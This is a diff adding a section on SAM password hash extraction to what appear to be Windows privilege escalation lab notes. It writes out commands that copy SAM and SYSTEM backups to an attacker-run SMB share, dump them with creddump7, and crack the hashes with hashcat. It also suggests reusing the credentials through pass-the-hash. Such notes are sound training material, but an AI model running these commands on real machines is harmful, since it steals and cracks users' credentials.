@@ -288,6 +288,40 @@ Then I can use msiexec to launch my malicious installer
 
   
 ## Passwords - Security Account Manager (SAM)
+*The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.* 
+  
+  From WinPEAS
+  ![image](https://user-images.githubusercontent.com/83407557/183223356-fb46c054-757a-45c8-8a6e-53a7b8dec47e.png)
+
+  To copy these back-ups to kali for hash extraction using impacket and python:
+  
+  `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+  
+  Then in windows target 
+  
+  `copy C:\Windows\Repair\SAM \\10.6.77.38\kali\`
+  `copy C:\Windows\Repair\SYSTEM \\10.6.77.38\kali\`
+  
+  Then on kali, I will use creddump7 (git clone https://github.com/Tib3rius/creddump7)
+  
+  Then `python3 creddump7/pwdump.py SYSTEM SAM`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183224060-49dce860-c31a-42bf-90d2-738359fb21a9.png)
+
+  
+  To crack the hashes with hashcat, the output of the above can be piped to a file called hashes and then cracked with a wordlist:
+  
+![image](https://user-images.githubusercontent.com/83407557/183224202-b10a443d-fc51-48d9-8d7b-04623ab60486.png)
+
+  ![image](https://user-images.githubusercontent.com/83407557/183224341-cbabb733-120d-40c2-b178-665fced6bc26.png)
+
+  
+  And I am able to crack the hashes with a publicly available wordlist(rockyou.txt)
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183224282-c5aa77a7-c5d9-4623-a37e-f31499fe3498.png)
+
+These can be used with the various methods such as RDP, SMB, PSexec, ect... or by PTH as will be shown next.
+  
 ## Passwords - Passing the Hash
 ## Scheduled Tasks
 ## Insecure GUI Apps
